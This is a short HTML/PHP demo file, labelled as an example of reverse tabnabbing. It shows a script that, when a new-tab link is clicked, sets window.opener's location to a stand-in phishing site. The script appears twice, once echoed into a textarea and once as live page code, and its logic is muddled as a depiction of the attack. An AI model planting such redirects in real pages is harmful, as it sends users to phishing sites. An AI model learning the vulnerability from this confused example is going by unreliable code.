<!DOCTYPE html>
    <html>
        <head></head>
        <body>
            <div>
                <textarea id="userprofile" name="userprofile" rows="30" cols="110">
                    <?php echo '
                    // *********************************************************************
                    // This is an example of how a reverse tabnabbing threat could look like  
                    // *********************************************************************
                    <script>
                    // wait for the page to fully load before executing the code
                    window.onload = function() {
                      // get a reference to the link element with the id "maliciousLink"
                      var link = document.getElementById("maliciousLink");
                      
                      // add a click event listener to the link
                      link.addEventListener("click", function() {
                        // get a reference to the opener window (i.e. the window that opened this one)
                        var openerWindow = window.opener;
                        
                        // check if the opener window exists and is not null
                        if (openerWindow != null) {
                          // change the location of the opener window to a phishing site
                          openerWindow.location = "https://www.phishingsite.com";
                        }
                      });
                    };
                  </script>
                  
                  <a href="https://www.example.com" target="_blank" id="maliciousLink">Click here</a>
                    '?>
                </textarea> 
            </div>
        </body>
    </html>






<script>
  // wait for the page to fully load before executing the code
  window.onload = function() {
    // get a reference to the link element with the id "maliciousLink"
    var link = document.getElementById("maliciousLink");
    
    // add a click event listener to the link
    link.addEventListener("click", function() {
      // get a reference to the opener window (i.e. the window that opened this one)
      var openerWindow = window.opener;
      
      // check if the opener window exists and is not null
      if (openerWindow != null) {
        // change the location of the opener window to a phishing site
        openerWindow.location = "https://www.phishingsite.com";
      }
    });
  };
</script>

<a href="https://www.example.com" target="_blank" id="maliciousLink">Click here</a>

